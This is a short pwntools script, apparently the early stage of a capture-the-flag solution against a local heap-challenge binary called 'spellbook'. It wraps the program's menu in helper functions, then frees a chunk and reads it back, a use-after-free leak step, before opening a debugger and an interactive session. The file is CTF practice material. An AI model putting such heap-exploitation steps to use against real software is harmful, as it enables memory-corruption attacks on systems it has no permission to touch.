#!/usr/bin/python3
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h", "-F" "#{pane_pid}", "-P"]
p = process("./spellbook")
ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a, b: p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)
# gdb.attach(p)
def add(idx, size):
    sla(">> ", "1")
    sla("entry: ", str(idx))
    sla("type: ", "e")
    sla("power: ", str(size))
    sla(": ", "data")


def show(idx):
    sla(">> ", "2")
    sla("entry: ", str(idx))


def edit(idx):
    sla(">> ", "3")
    sla("entry: ", str(idx))
    sla("type: ", "asdf")
    sla(": ", "data")


def free(idx):
    sla(">> ", "4")
    sla("entry: ", str(idx))


add(0, 0x88)
add(1, 0x18)
gdb.attach(p)
free(0)
show(0)

p.interactive()
